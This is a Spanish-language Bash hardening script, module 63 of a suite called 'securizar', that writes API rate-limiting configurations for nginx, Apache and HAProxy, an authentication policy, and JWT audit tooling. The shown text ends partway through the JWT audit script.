#!/bin/bash
# ============================================================
# seguridad-api.sh - Modulo 63: Seguridad de APIs
# ============================================================
# Secciones:
#   S1  - Rate limiting y throttling
#   S2  - API authentication hardening (OAuth2, JWT, API keys)
#   S3  - Input validation y schema enforcement
#   S4  - CORS y security headers
#   S5  - API gateway hardening (nginx/HAProxy)
#   S6  - GraphQL security
#   S7  - Webhook signature verification
#   S8  - mTLS para microservicios
#   S9  - API logging y audit trails
#   S10 - Auditoria integral de seguridad API
# ============================================================

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "${SCRIPT_DIR}/lib/securizar-common.sh"

require_root
securizar_setup_traps
init_backup "api-security"

# ── Pre-check: detectar secciones ya aplicadas ──────────────
_precheck 10
_pc 'check_file_exists /etc/securizar/api-rate-limits.conf'
_pc 'check_file_exists /etc/securizar/api-auth-policy.conf'
_pc 'check_file_exists /etc/securizar/api-input-validation.conf'
_pc 'check_file_exists /usr/local/bin/auditar-headers-api.sh'
_pc 'check_file_exists /etc/securizar/api-gateway/nginx-api-gateway.conf'
_pc 'check_file_exists /usr/local/bin/auditar-graphql.sh'
_pc 'check_file_exists /usr/local/bin/verificar-webhooks.sh'
_pc 'check_file_exists /usr/local/bin/gestionar-mtls.sh'
_pc 'check_file_exists /usr/local/bin/analizar-logs-api.sh'
_pc 'check_file_exists /usr/local/bin/auditar-seguridad-api.sh'
_precheck_result

echo ""
echo "╔═══════════════════════════════════════════════════════════╗"
echo "║   MODULO 63 - SEGURIDAD DE APIs                          ║"
echo "║   Rate limiting, auth, validation, CORS, gateway,        ║"
echo "║   GraphQL, webhooks, mTLS, logging, auditoria            ║"
echo "╚═══════════════════════════════════════════════════════════╝"
echo ""

log_section "MODULO 63: SEGURIDAD DE APIs"
log_info "Distro detectada: $DISTRO_NAME ($DISTRO_FAMILY)"

# ── Directorios base ─────────────────────────────────────────
mkdir -p /etc/securizar
mkdir -p /etc/securizar/api-gateway
mkdir -p /var/log/securizar
mkdir -p /usr/local/share/securizar

# ── Deteccion de servicios ───────────────────────────────────
NGINX_INSTALLED=false
APACHE_INSTALLED=false
HAPROXY_INSTALLED=false
NGINX_CONF_DIR=""
APACHE_CONF_DIR=""
APACHE_SERVICE=""
HAPROXY_CONF_DIR=""

if command -v nginx &>/dev/null; then
    NGINX_INSTALLED=true
    NGINX_CONF_DIR="/etc/nginx"
    log_info "nginx detectado: $(nginx -v 2>&1 | head -1)"
fi

if command -v httpd &>/dev/null || command -v apache2ctl &>/dev/null; then
    APACHE_INSTALLED=true
    if [[ "$DISTRO_FAMILY" == "debian" ]]; then
        APACHE_CONF_DIR="/etc/apache2"
        APACHE_SERVICE="apache2"
    else
        APACHE_CONF_DIR="/etc/httpd"
        APACHE_SERVICE="httpd"
    fi
    log_info "Apache detectado en: $APACHE_CONF_DIR"
fi

if command -v haproxy &>/dev/null; then
    HAPROXY_INSTALLED=true
    HAPROXY_CONF_DIR="/etc/haproxy"
    log_info "HAProxy detectado: $(haproxy -v 2>&1 | head -1)"
fi

if [[ "$NGINX_INSTALLED" == false && "$APACHE_INSTALLED" == false && "$HAPROXY_INSTALLED" == false ]]; then
    log_warn "No se detecto nginx, Apache ni HAProxy instalados"
    log_warn "Algunas secciones generaran plantillas sin aplicar"
fi

# ── Helpers ──────────────────────────────────────────────────
timestamp_id() {
    date '+%Y%m%d-%H%M%S'
}

generate_random_key() {
    local length="${1:-64}"
    openssl rand -hex "$((length / 2))" 2>/dev/null || head -c "$length" /dev/urandom | od -An -tx1 | tr -d ' \n' | head -c "$length"
}

# ============================================================
# S1: RATE LIMITING Y THROTTLING
# ============================================================
log_section "S1: Rate limiting y throttling"

log_info "Configura rate limiting para proteger APIs contra abuso:"
log_info "  - Nginx: limit_req_zone por IP y API key"
log_info "  - Apache: mod_ratelimit"
log_info "  - HAProxy: stick-tables para rate limiting"
log_info "  - Config centralizada en /etc/securizar/api-rate-limits.conf"
log_info "  - Script /usr/local/bin/configurar-rate-limit.sh"
echo ""

if check_file_exists /etc/securizar/api-rate-limits.conf; then
    log_already "Rate limiting y throttling (api-rate-limits.conf existe)"
elif ask "¿Configurar rate limiting y throttling para APIs?"; then

    # ── Config centralizada de rate limits ────────────────────
    RATE_CONF="/etc/securizar/api-rate-limits.conf"
    if [[ -f "$RATE_CONF" ]]; then
        cp -a "$RATE_CONF" "$BACKUP_DIR/" 2>/dev/null || true
        log_change "Backup" "$RATE_CONF existente"
    fi

    cat > "$RATE_CONF" << 'EOF'
# ============================================================
# api-rate-limits.conf - Configuracion de rate limiting para APIs
# Generado por securizar - Modulo 63
# ============================================================

# ── Limites globales ─────────────────────────────────────────
# Formato: NOMBRE=requests_per_second
RATE_GLOBAL=100
RATE_AUTH_ENDPOINTS=5
RATE_SEARCH_ENDPOINTS=20
RATE_WRITE_ENDPOINTS=30
RATE_READ_ENDPOINTS=60
RATE_UPLOAD_ENDPOINTS=3
RATE_WEBHOOK_ENDPOINTS=50

# ── Burst (rafaga permitida antes de limitar) ────────────────
BURST_GLOBAL=50
BURST_AUTH=10
BURST_SEARCH=30
BURST_WRITE=20
BURST_READ=40
BURST_UPLOAD=5
BURST_WEBHOOK=30

# ── Limites por API key (requests por minuto) ────────────────
RATE_PER_KEY_FREE=60
RATE_PER_KEY_BASIC=300
RATE_PER_KEY_PRO=1000
RATE_PER_KEY_ENTERPRISE=5000

# ── Ventanas de tiempo (segundos) ────────────────────────────
WINDOW_GLOBAL=1
WINDOW_PER_KEY=60
WINDOW_SLIDING=true

# ── Acciones al exceder limite ───────────────────────────────
# OPTIONS: reject, delay, queue
ACTION_EXCEEDED=reject
RESPONSE_CODE_EXCEEDED=429
RETRY_AFTER_SECONDS=60

# ── IPs en whitelist (sin rate limit) ────────────────────────
# Separadas por comas
WHITELIST_IPS="127.0.0.1,::1"

# ── IPs en blacklist (bloqueadas permanentemente) ─────────────
BLACKLIST_IPS=""
EOF
    log_change "Creado" "$RATE_CONF"

    # ── Nginx rate limiting ──────────────────────────────────
    if [[ "$NGINX_INSTALLED" == true ]]; then
        mkdir -p "$NGINX_CONF_DIR/conf.d"
        mkdir -p "$NGINX_CONF_DIR/snippets"

        if [[ -f "$NGINX_CONF_DIR/conf.d/securizar-api-ratelimit.conf" ]]; then
            cp -a "$NGINX_CONF_DIR/conf.d/securizar-api-ratelimit.conf" "$BACKUP_DIR/" 2>/dev/null || true
        fi

        cat > "$NGINX_CONF_DIR/conf.d/securizar-api-ratelimit.conf" << 'EOF'
# ============================================================
# securizar-api-ratelimit.conf - Rate limiting para APIs (nginx)
# Generado por securizar - Modulo 63
# ============================================================

# ── Zonas de rate limiting por IP ────────────────────────────
# General API: 100 req/s per IP
limit_req_zone $binary_remote_addr zone=api_global:20m rate=100r/s;

# Auth endpoints: 5 req/s per IP (login, register, password reset)
limit_req_zone $binary_remote_addr zone=api_auth:10m rate=5r/s;

# Search endpoints: 20 req/s per IP
limit_req_zone $binary_remote_addr zone=api_search:10m rate=20r/s;

# Write endpoints (POST/PUT/PATCH/DELETE): 30 req/s per IP
limit_req_zone $binary_remote_addr zone=api_write:10m rate=30r/s;

# Upload endpoints: 3 req/s per IP
limit_req_zone $binary_remote_addr zone=api_upload:10m rate=3r/s;

# ── Zonas de rate limiting por API key ───────────────────────
# Usa la cabecera X-API-Key como clave
map $http_x_api_key $api_key_zone {
    default     $binary_remote_addr;
    "~.+"       $http_x_api_key;
}
limit_req_zone $api_key_zone zone=api_per_key:20m rate=60r/m;

# ── Zona de conexiones simultaneas ──────────────────────────
limit_conn_zone $binary_remote_addr zone=api_conn:10m;

# ── Configuracion de respuesta 429 ──────────────────────────
limit_req_status 429;
limit_conn_status 429;

# ── Logging de rate limiting ─────────────────────────────────
# Activar log de requests rechazados por rate limit
limit_req_log_level warn;
limit_conn_log_level warn;

# ============================================================
# USO EN BLOQUES server/location:
#
# location /api/ {
#     limit_req zone=api_global burst=50 nodelay;
#     limit_conn api_conn 20;
#     proxy_pass http://backend;
# }
#
# location /api/auth/ {
#     limit_req zone=api_auth burst=10 nodelay;
#     proxy_pass http://backend;
# }
#
# location /api/search/ {
#     limit_req zone=api_search burst=30 delay=20;
#     proxy_pass http://backend;
# }
#
# location /api/upload/ {
#     limit_req zone=api_upload burst=5 nodelay;
#     client_max_body_size 50m;
#     proxy_pass http://backend;
# }
# ============================================================
EOF
        log_change "Creado" "$NGINX_CONF_DIR/conf.d/securizar-api-ratelimit.conf"

        # Snippet para usar en bloques location
        cat > "$NGINX_CONF_DIR/snippets/securizar-api-ratelimit-locations.conf" << 'EOF'
# ============================================================
# securizar-api-ratelimit-locations.conf
# Incluir dentro de bloques server { } para APIs
# Generado por securizar - Modulo 63
# ============================================================

# ── API general ──────────────────────────────────────────────
location /api/ {
    limit_req zone=api_global burst=50 nodelay;
    limit_conn api_conn 20;

    # Cabeceras de rate limit en respuesta
    add_header X-RateLimit-Limit "100" always;
    add_header Retry-After "60" always;

    proxy_pass http://api_backend;
    proxy_set_header Host $host;
    proxy_set_header X-Real-IP $remote_addr;
    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    proxy_set_header X-Forwarded-Proto $scheme;
}

# ── Auth endpoints (mas restrictivos) ────────────────────────
location /api/auth/ {
    limit_req zone=api_auth burst=10 nodelay;

    add_header X-RateLimit-Limit "5" always;
    add_header Retry-After "60" always;

    proxy_pass http://api_backend;
    proxy_set_header Host $host;
    proxy_set_header X-Real-IP $remote_addr;
    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
}

# ── Search endpoints ─────────────────────────────────────────
location /api/search/ {
    limit_req zone=api_search burst=30 delay=20;

    proxy_pass http://api_backend;
    proxy_set_header Host $host;
    proxy_set_header X-Real-IP $remote_addr;
}

# ── Upload endpoints ─────────────────────────────────────────
location /api/upload/ {
    limit_req zone=api_upload burst=5 nodelay;
    client_max_body_size 50m;

    proxy_pass http://api_backend;
    proxy_set_header Host $host;
    proxy_set_header X-Real-IP $remote_addr;
}

# ── Custom error page for 429 ────────────────────────────────
error_page 429 = @rate_limited;
location @rate_limited {
    default_type application/json;
    return 429 '{"error":"rate_limit_exceeded","message":"Too many requests. Please retry after the Retry-After period.","retry_after":60}';
}
EOF
        log_change "Creado" "$NGINX_CONF_DIR/snippets/securizar-api-ratelimit-locations.conf"

        if nginx -t 2>/dev/null; then
            log_info "Configuracion nginx validada correctamente"
        else
            log_warn "Revisar configuracion nginx: nginx -t"
        fi
    fi

    # ── Apache rate limiting ─────────────────────────────────
    if [[ "$APACHE_INSTALLED" == true ]]; then
        if [[ "$DISTRO_FAMILY" == "debian" ]]; then
            APACHE_RATE_CONF="$APACHE_CONF_DIR/conf-available/securizar-api-ratelimit.conf"
        else
            mkdir -p "$APACHE_CONF_DIR/conf.d"
            APACHE_RATE_CONF="$APACHE_CONF_DIR/conf.d/securizar-api-ratelimit.conf"
        fi

        if [[ -f "$APACHE_RATE_CONF" ]]; then
            cp -a "$APACHE_RATE_CONF" "$BACKUP_DIR/" 2>/dev/null || true
        fi

        cat > "$APACHE_RATE_CONF" << 'EOF'
# ============================================================
# securizar-api-ratelimit.conf - Rate limiting para APIs (Apache)
# Generado por securizar - Modulo 63
# ============================================================

# ── mod_ratelimit para limitar ancho de banda ────────────────
<IfModule mod_ratelimit.c>
    <Location /api/>
        SetOutputFilter RATE_LIMIT
        SetEnv rate-limit 1024
    </Location>
</IfModule>

# ── mod_evasive para proteccion DDoS (si disponible) ────────
<IfModule mod_evasive20.c>
    DOSHashTableSize    3097
    DOSPageCount        5
    DOSSiteCount        100
    DOSPageInterval     1
    DOSSiteInterval     1
    DOSBlockingPeriod   60
    DOSLogDir           "/var/log/securizar/mod_evasive"
</IfModule>

# ── Limitar request body para API ────────────────────────────
<Location /api/>
    LimitRequestBody 10485760
    LimitRequestFields 50
    LimitRequestFieldSize 8190
    LimitRequestLine 8190
</Location>

# ── Auth endpoints mas restrictivos ──────────────────────────
<Location /api/auth/>
    LimitRequestBody 1048576
    LimitRequestFields 20
</Location>

# ── Upload endpoints ─────────────────────────────────────────
<Location /api/upload/>
    LimitRequestBody 52428800
</Location>

# ── Custom 429 error ─────────────────────────────────────────
ErrorDocument 429 '{"error":"rate_limit_exceeded","message":"Too many requests"}'
EOF
        log_change "Creado" "$APACHE_RATE_CONF"

        if [[ "$DISTRO_FAMILY" == "debian" ]]; then
            a2enconf securizar-api-ratelimit 2>/dev/null || true
            a2enmod ratelimit 2>/dev/null || true
        fi
    fi

    # ── HAProxy rate limiting ────────────────────────────────
    if [[ "$HAPROXY_INSTALLED" == true ]]; then
        HAPROXY_RATE_CONF="/etc/securizar/api-gateway/haproxy-ratelimit.cfg"
        if [[ -f "$HAPROXY_RATE_CONF" ]]; then
            cp -a "$HAPROXY_RATE_CONF" "$BACKUP_DIR/" 2>/dev/null || true
        fi

        cat > "$HAPROXY_RATE_CONF" << 'EOF'
# ============================================================
# haproxy-ratelimit.cfg - Rate limiting para APIs (HAProxy)
# Generado por securizar - Modulo 63
# Incluir en la configuracion principal de HAProxy
# ============================================================

# ── Frontend con rate limiting ───────────────────────────────
frontend api_frontend
    bind *:443 ssl crt /etc/haproxy/certs/
    mode http

    # Stick-table para tracking de requests por IP
    stick-table type ip size 200k expire 30s store http_req_rate(10s),conn_cur,gpc0

    # Trackear IP del cliente
    http-request track-sc0 src

    # Denegar si excede 100 req/10s
    http-request deny deny_status 429 if { sc_http_req_rate(0) gt 100 }

    # Denegar si mas de 20 conexiones simultaneas
    http-request deny deny_status 429 if { sc_conn_cur(0) gt 20 }

    # Stick-table para auth endpoints
    stick-table type ip size 100k expire 60s store http_req_rate(60s),gpc0

    # Rate limit mas estricto para /api/auth/
    acl is_auth_endpoint path_beg /api/auth/
    http-request track-sc1 src if is_auth_endpoint
    http-request deny deny_status 429 if is_auth_endpoint { sc1_http_req_rate(1) gt 10 }

    # Cabeceras de rate limit
    http-response set-header X-RateLimit-Limit 100
    http-response set-header X-RateLimit-Remaining %[sc0_http_req_rate(10s),sub(100)]

    # Backend routing
    default_backend api_servers

# ── Backend ──────────────────────────────────────────────────
backend api_servers
    mode http
    balance roundrobin
    option httpchk GET /health
    http-check expect status 200

    server api1 127.0.0.1:8080 check inter 5s fall 3 rise 2
    server api2 127.0.0.1:8081 check inter 5s fall 3 rise 2
EOF
        log_change "Creado" "$HAPROXY_RATE_CONF"
    fi

    # ── Script de configuracion de rate limits ───────────────
    RATE_SCRIPT="/usr/local/bin/configurar-rate-limit.sh"
    if [[ -f "$RATE_SCRIPT" ]]; then
        cp -a "$RATE_SCRIPT" "$BACKUP_DIR/" 2>/dev/null || true
    fi

    cat > "$RATE_SCRIPT" << 'EOFRATESCRIPT'
#!/bin/bash
# ============================================================
# configurar-rate-limit.sh - Gestion de rate limiting para APIs
# Generado por securizar - Modulo 63
# ============================================================
# Uso: configurar-rate-limit.sh {status|test|update|whitelist|blacklist}
# ============================================================
set -uo pipefail

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
CYAN='\033[0;36m'; BOLD='\033[1m'; DIM='\033[2m'; NC='\033[0m'

CONF="/etc/securizar/api-rate-limits.conf"
ACTION="${1:-status}"

usage() {
    echo "Uso: $0 {status|test|update|whitelist|blacklist}"
    echo ""
    echo "Comandos:"
    echo "  status              Muestra configuracion actual de rate limits"
    echo "  test URL [N]        Envia N peticiones a URL para probar limits"
    echo "  update KEY VALUE    Actualiza un parametro en la configuracion"
    echo "  whitelist IP        Anade IP a la whitelist"
    echo "  blacklist IP        Anade IP a la blacklist"
    exit 1
}

show_status() {
    echo -e "${BOLD}══════════════════════════════════════════${NC}"
    echo -e "${BOLD}  ESTADO DE RATE LIMITING${NC}"
    echo -e "${BOLD}══════════════════════════════════════════${NC}"
    echo ""

    if [[ ! -f "$CONF" ]]; then
        echo -e "${RED}Error: $CONF no encontrado${NC}"
        exit 1
    fi

    echo -e "${CYAN}── Limites globales ──${NC}"
    while IFS='=' read -r key value; do
        [[ -z "$key" || "$key" == \#* ]] && continue
        key="${key%%[[:space:]]*}"
        value="${value##[[:space:]]*}"
        if [[ "$key" =~ ^RATE_ ]]; then
            echo -e "  ${GREEN}$key${NC} = $value"
        fi
    done < "$CONF"

    echo ""
    echo -e "${CYAN}── Burst ──${NC}"
    while IFS='=' read -r key value; do
        [[ -z "$key" || "$key" == \#* ]] && continue
        key="${key%%[[:space:]]*}"
        value="${value##[[:space:]]*}"
        if [[ "$key" =~ ^BURST_ ]]; then
            echo -e "  ${GREEN}$key${NC} = $value"
        fi
    done < "$CONF"

    echo ""
    echo -e "${CYAN}── Servicios detectados ──${NC}"
    if command -v nginx &>/dev/null; then
        echo -e "  ${GREEN}nginx${NC}: $(nginx -v 2>&1 | head -1)"
        if [[ -f /etc/nginx/conf.d/securizar-api-ratelimit.conf ]]; then
            echo -e "    Rate limit config: ${GREEN}activo${NC}"
        else
            echo -e "    Rate limit config: ${RED}no encontrado${NC}"
        fi
    fi
    if command -v haproxy &>/dev/null; then
        echo -e "  ${GREEN}HAProxy${NC}: $(haproxy -v 2>&1 | head -1)"
    fi
    if command -v httpd &>/dev/null || command -v apache2ctl &>/dev/null; then
        echo -e "  ${GREEN}Apache${NC}: detectado"
    fi
}

test_rate_limit() {
    local url="${2:-}"
    local count="${3:-20}"

    if [[ -z "$url" ]]; then
        echo -e "${RED}Error: Especifica URL para test${NC}"
        echo "Uso: $0 test http://localhost/api/endpoint [count]"
        exit 1
    fi

    if ! command -v curl &>/dev/null; then
        echo -e "${RED}Error: curl necesario para test${NC}"
        exit 1
    fi

    echo -e "${BOLD}Testing rate limit: ${url}${NC}"
    echo -e "Enviando ${count} peticiones..."
    echo ""

    local success=0
    local limited=0
    local errors=0

    for i in $(seq 1 "$count"); do
        status=$(curl -s -o /dev/null -w "%{http_code}" "$url" 2>/dev/null || echo "000")
        case "$status" in
            2*) ((success++)) || true; echo -e "  [$i] ${GREEN}${status}${NC}" ;;
            429) ((limited++)) || true; echo -e "  [$i] ${YELLOW}${status} (rate limited)${NC}" ;;
            *) ((errors++)) || true; echo -e "  [$i] ${RED}${status}${NC}" ;;
        esac
    done

    echo ""
    echo -e "${CYAN}── Resultados ──${NC}"
    echo -e "  Exitosas:    ${GREEN}${success}${NC}"
    echo -e "  Rate limited: ${YELLOW}${limited}${NC}"
    echo -e "  Errores:     ${RED}${errors}${NC}"
}

update_config() {
    local key="${2:-}"
    local value="${3:-}"
    if [[ -z "$key" || -z "$value" ]]; then
        echo "Uso: $0 update KEY VALUE"
        exit 1
    fi
    if grep -q "^${key}=" "$CONF" 2>/dev/null; then
        sed -i "s|^${key}=.*|${key}=${value}|" "$CONF"
        echo -e "${GREEN}Actualizado: ${key}=${value}${NC}"
    else
        echo "${key}=${value}" >> "$CONF"
        echo -e "${GREEN}Anadido: ${key}=${value}${NC}"
    fi
}

manage_whitelist() {
    local ip="${2:-}"
    if [[ -z "$ip" ]]; then
        echo "Uso: $0 whitelist IP"
        exit 1
    fi
    local current
    current=$(grep "^WHITELIST_IPS=" "$CONF" | cut -d= -f2 | tr -d '"')
    if [[ "$current" == *"$ip"* ]]; then
        echo -e "${YELLOW}IP $ip ya esta en whitelist${NC}"
    else
        local new_list="${current},${ip}"
        sed -i "s|^WHITELIST_IPS=.*|WHITELIST_IPS=\"${new_list}\"|" "$CONF"
        echo -e "${GREEN}Anadido $ip a whitelist${NC}"
    fi
}

manage_blacklist() {
    local ip="${2:-}"
    if [[ -z "$ip" ]]; then
        echo "Uso: $0 blacklist IP"
        exit 1
    fi
    local current
    current=$(grep "^BLACKLIST_IPS=" "$CONF" | cut -d= -f2 | tr -d '"')
    if [[ "$current" == *"$ip"* ]]; then
        echo -e "${YELLOW}IP $ip ya esta en blacklist${NC}"
    else
        local new_list
        if [[ -z "$current" ]]; then
            new_list="$ip"
        else
            new_list="${current},${ip}"
        fi
        sed -i "s|^BLACKLIST_IPS=.*|BLACKLIST_IPS=\"${new_list}\"|" "$CONF"
        echo -e "${GREEN}Anadido $ip a blacklist${NC}"
    fi
}

case "$ACTION" in
    status)    show_status ;;
    test)      test_rate_limit "$@" ;;
    update)    update_config "$@" ;;
    whitelist) manage_whitelist "$@" ;;
    blacklist) manage_blacklist "$@" ;;
    *)         usage ;;
esac
EOFRATESCRIPT
    chmod +x "$RATE_SCRIPT"
    log_change "Creado" "$RATE_SCRIPT"
    log_change "Permisos" "$RATE_SCRIPT -> +x"

    log_info "Rate limiting configurado"
else
    log_skip "Rate limiting y throttling"
fi

# ============================================================
# S2: API AUTHENTICATION HARDENING
# ============================================================
log_section "S2: API authentication hardening (OAuth2, JWT, API keys)"

log_info "Audita y fortalece la autenticacion de APIs:"
log_info "  - Validacion de configuraciones JWT"
log_info "  - Auditoria de configuracion OAuth2"
log_info "  - Gestion de API keys (rotacion, hashing)"
log_info "  - Politica de autenticacion en /etc/securizar/api-auth-policy.conf"
echo ""

if check_file_exists /etc/securizar/api-auth-policy.conf; then
    log_already "API authentication hardening (api-auth-policy.conf existe)"
elif ask "¿Configurar hardening de autenticacion de APIs?"; then

    # ── Politica de autenticacion ────────────────────────────
    AUTH_POLICY="/etc/securizar/api-auth-policy.conf"
    if [[ -f "$AUTH_POLICY" ]]; then
        cp -a "$AUTH_POLICY" "$BACKUP_DIR/" 2>/dev/null || true
        log_change "Backup" "$AUTH_POLICY existente"
    fi

    cat > "$AUTH_POLICY" << 'EOF'
# ============================================================
# api-auth-policy.conf - Politica de autenticacion de APIs
# Generado por securizar - Modulo 63
# ============================================================

# ── JWT Policy ───────────────────────────────────────────────
# Algoritmos permitidos (NO incluir 'none' ni HS256 con clave corta)
JWT_ALLOWED_ALGORITHMS="RS256,RS384,RS512,ES256,ES384,ES512,PS256,PS384,PS512"
JWT_FORBIDDEN_ALGORITHMS="none,HS256"
JWT_MIN_SECRET_LENGTH=64
JWT_MAX_TOKEN_LIFETIME_SECONDS=3600
JWT_REQUIRE_EXPIRATION=true
JWT_REQUIRE_ISSUER=true
JWT_REQUIRE_AUDIENCE=true
JWT_REQUIRE_NOT_BEFORE=true
JWT_CLOCK_SKEW_SECONDS=30

# ── OAuth2 Policy ────────────────────────────────────────────
OAUTH2_REQUIRE_PKCE=true
OAUTH2_REQUIRE_STATE=true
OAUTH2_TOKEN_LIFETIME=3600
OAUTH2_REFRESH_TOKEN_LIFETIME=86400
OAUTH2_REQUIRE_HTTPS_REDIRECT=true
OAUTH2_ALLOWED_GRANT_TYPES="authorization_code,client_credentials,refresh_token"
OAUTH2_FORBIDDEN_GRANT_TYPES="implicit,password"
OAUTH2_REQUIRE_CLIENT_AUTH=true

# ── API Key Policy ───────────────────────────────────────────
API_KEY_MIN_LENGTH=32
API_KEY_HASH_ALGORITHM="sha256"
API_KEY_NEVER_STORE_PLAINTEXT=true
API_KEY_ROTATION_DAYS=90
API_KEY_MAX_AGE_DAYS=365
API_KEY_PREFIX_LENGTH=8
API_KEY_REQUIRE_RATE_LIMIT=true
API_KEY_LOG_USAGE=true

# ── General Auth Policy ─────────────────────────────────────
AUTH_REQUIRE_TLS=true
AUTH_MIN_TLS_VERSION="1.2"
AUTH_BLOCK_AFTER_FAILURES=5
AUTH_LOCKOUT_DURATION_SECONDS=900
AUTH_LOG_ALL_ATTEMPTS=true
AUTH_REQUIRE_USER_AGENT=true
EOF
    log_change "Creado" "$AUTH_POLICY"

    # ── Script de auditoria JWT ──────────────────────────────
    JWT_AUDIT="/usr/local/bin/auditar-jwt.sh"
    if [[ -f "$JWT_AUDIT" ]]; then
        cp -a "$JWT_AUDIT" "$BACKUP_DIR/" 2>/dev/null || true
    fi

    cat > "$JWT_AUDIT" << 'EOFJWTAUDIT'
#!/bin/bash
# ============================================================
# auditar-jwt.sh - Auditoria de configuraciones JWT
# Generado por securizar - Modulo 63
# ============================================================
# Uso: auditar-jwt.sh [--token TOKEN] [--config DIR] [--scan DIR]
# ============================================================
set -uo pipefail

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
CYAN='\033[0;36m'; BOLD='\033[1m'; NC='\033[0m'

POLICY="/etc/securizar/api-auth-policy.conf"
ISSUES=0
WARNINGS=0
PASSED=0

# Cargar politica si existe
if [[ -f "$POLICY" ]]; then
    source "$POLICY" 2>/dev/null || true
fi

echo -e "${BOLD}══════════════════════════════════════════${NC}"
echo -e "${BOLD}  AUDITORIA DE CONFIGURACION JWT${NC}"
echo -e "${BOLD}══════════════════════════════════════════${NC}"
echo ""

# ── Funciones de reporte ─────────────────────────────────────
pass() { echo -e "  ${GREEN}[PASS]${NC} $1"; ((PASSED++)) || true; }
warn() { echo -e "  ${YELLOW}[WARN]${NC} $1"; ((WARNINGS++)) || true; }
fail() { echo -e "  ${RED}[FAIL]${NC} $1"; ((ISSUES++)) || true; }

# ── Decodificar JWT (Base64) ─────────────────────────────────
decode_jwt_part() {
    local part="$1"
    # Anadir padding si es necesario
    local padded="$part"
    local mod=$((${#padded} % 4))
    if [[ $mod -eq 2 ]]; then padded="${padded}=="
    elif [[ $mod -eq 3 ]]; then padded="${padded}="
    fi
    echo "$padded" | tr '_-' '/+' | base64 -d 2>/dev/null || echo "{}"
}

# ── Analizar un token JWT ────────────────────────────────────
analyze_token() {
    local token="$1"
    echo -e "${CYAN}── Analizando token JWT ──${NC}"

    # Separar partes
    local header payload signature
    IFS='.' read -r header payload signature <<< "$token"

    if [[ -z "$header" || -z "$payload" ]]; then
        fail "Token JWT malformado (faltan partes)"
        return
    fi

    # Decodificar header
    local header_json
    header_json=$(decode_jwt_part "$header")
    echo -e "  Header: $header_json"

    # Verificar algoritmo
    local alg
    alg=$(echo "$header_json" | grep -oP '"alg"\s*:\s*"\K[^"]+' || echo "unknown")
    echo -e "  Algoritmo: $alg"

    if [[ "$alg" == "none" ]]; then
        fail "Algoritmo 'none' detectado - Token sin firma (CRITICO)"
    elif [[ "$alg" == "HS256" ]]; then
        warn "HS256 detectado - Considerar RS256/ES256 para produccion"
    elif [[ "$alg" =~ ^(RS256|RS384|RS512|ES256|ES384|ES512|PS256|PS384|PS512)$ ]]; then
        pass "Algoritmo seguro: $alg"
    else
        warn "Algoritmo desconocido: $alg"
    fi

    # Verificar tipo
    local typ
    typ=$(echo "$header_json" | grep -oP '"typ"\s*:\s*"\K[^"]+' || echo "")
    if [[ "$typ" != "JWT" && -n "$typ" ]]; then
        warn "Tipo inesperado: $typ (esperado: JWT)"
    fi

    # Decodificar payload
    local payload_json
    payload_json=$(decode_jwt_part "$payload")
    echo -e "  Payload: ${payload_json:0:200}..."

    # Verificar expiracion
    local exp
    exp=$(echo "$payload_json" | grep -oP '"exp"\s*:\s*\K[0-9]+' || echo "")
    if [[ -z "$exp" ]]; then
        fail "Sin claim 'exp' (expiracion) - Token no expira"
    else
        local now
        now=$(date +%s)
        if [[ "$exp" -lt "$now" ]]; then
            pass "Token expirado (exp=$exp, now=$now)"
        else
            local remaining=$((exp - now))
            local max_lifetime="${JWT_MAX_TOKEN_LIFETIME_SECONDS:-3600}"
            if [[ $remaining -gt $max_lifetime ]]; then
                warn "Token con lifetime muy largo: ${remaining}s (max: ${max_lifetime}s)"
            else
                pass "Expiracion valida: ${remaining}s restantes"
            fi
        fi
    fi

    # Verificar issuer
    local iss
    iss=$(echo "$payload_json" | grep -oP '"iss"\s*:\s*"\K[^"]+' || echo "")
    if [[ -z "$iss" ]]; then
        warn "Sin claim 'iss' (issuer)"
    else
        pass "Issuer presente: $iss"
    fi

    # Verificar audience
    local aud
    aud=$(echo "$payload_json" | grep -oP '"aud"\s*:\s*"\K[^"]+' || echo "")
    if [[ -z "$aud" ]]; then
        warn "Sin claim 'aud' (audience)"
    else
        pass "Audience presente: $aud"
    fi

    # Verificar nbf
    local nbf
    nbf=$(echo "$payload_json" | grep -oP '"nbf"\s*:\s*\K[0-9]+' || echo "")
    if [[ -z "$nbf" ]]; then
        warn "Sin claim 'nbf' (not before)"
    else
        pass "Not-before presente: $nbf"
    fi

    # Verificar iat
    local iat
    iat=$(echo "$payload_json" | grep -oP '"iat"\s*:\s*\K[0-9]+' || echo "")
    if [[ -z "$iat" ]]; then
        warn "Sin claim 'iat' (issued at)"
    else
        pass "Issued-at presente: $iat"
    fi

    # Verificar jti (previene replay)
    local jti
    jti=$(echo "$payload_json" | grep -oP '"jti"\s*:\s*"\K[^"]+' || echo "")
    if [[ -z "$jti" ]]; then
        warn "Sin claim 'jti' (JWT ID) - no protege contra replay"
    else
        pass "JWT ID presente: $jti"
    fi

    # Verificar firma presente
    if [[ -z "$signature" ]]; then
        fail "Token sin firma"
    else
        pass "Firma presente (${#signature} chars)"
    fi
}

# ── Escanear directorio por secretos JWT debiles ─────────────
scan_directory() {
    local scan_dir="$1"
    echo -e "${CYAN}── Escaneando directorio: $scan_dir ──${NC}"

    local found=0

    # Buscar archivos de configuracion con secretos JWT
    while IFS= read -r -d '' file; do
        # Buscar patrones de secretos JWT debiles
        if grep -qiE '(jwt[_-]?secret|jwt[_-]?key|secret[_-]?key)\s*[:=]\s*.{1,16}["\x27]' "$file" 2>/dev/null; then
            fail "Posible secreto JWT corto en: $file"
            grep -niE '(jwt[_-]?secret|jwt[_-]?key|secret[_-]?key)\s*[:=]' "$file" 2>/dev/null | head -3 | while IFS= read -r line; do
                echo -e "    ${DIM}${line}${NC}"
            done
            ((found++)) || true
        fi

        # Buscar 'none' algorithm en configs
        if grep -qiE 'algorithm.*none|alg.*none' "$file" 2>/dev/null; then
            fail "Algoritmo 'none' configurado en: $file"
            ((found++)) || true
        fi

        # Buscar tokens JWT hardcodeados
